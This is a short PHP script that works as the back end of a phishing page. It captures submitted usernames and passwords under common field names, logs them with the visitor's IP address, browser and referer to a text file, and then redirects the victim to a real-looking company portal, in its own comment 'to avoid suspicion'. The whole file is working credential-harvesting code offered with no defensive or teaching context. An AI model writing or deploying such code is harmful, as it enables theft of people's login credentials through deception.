<?php
// Log file to store captured credentials
$log_file = 'captured_credentials.txt';

// Get the current date and time
$date = date('Y-m-d H:i:s');

// Get the visitor's IP address
$ip = $_SERVER['REMOTE_ADDR'];

// Get the user agent (browser info)
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// Get the referer URL (where they came from)
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Unknown';

// Initialize credential variables
$username = '';
$password = '';

// Check for POST data (form submission)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Look for various common username/email field names
    foreach (['username', 'user', 'email', 'login', 'user_id', 'userid'] as $field) {
        if (isset($_POST[$field])) {
            $username = $_POST[$field];
            break;
        }
    }
    
    // Look for various common password field names
    foreach (['password', 'pass', 'pwd', 'passwd'] as $field) {
        if (isset($_POST[$field])) {
            $password = $_POST[$field];
            break;
        }
    }
    
    // If username and password weren't found with common names, log all POST data
    if (empty($username) || empty($password)) {
        $post_data = print_r($_POST, true);
    } else {
        $post_data = '';
    }
    
    // Format log entry
    $log_entry = "==================================\n";
    $log_entry .= "Date: $date\n";
    $log_entry .= "IP Address: $ip\n";
    $log_entry .= "User Agent: $user_agent\n";
    $log_entry .= "Referer: $referer\n";
    $log_entry .= "Username/Email: $username\n";
    $log_entry .= "Password: $password\n";
    
    if (!empty($post_data)) {
        $log_entry .= "All POST data:\n$post_data\n";
    }
    
    $log_entry .= "==================================\n\n";
    
    // Write to log file
    file_put_contents($log_file, $log_entry, FILE_APPEND);
    
    // Redirect to the legitimate site (to avoid suspicion)
    header('Location: https://portal.lumoninc.com');
    exit;
}
?> 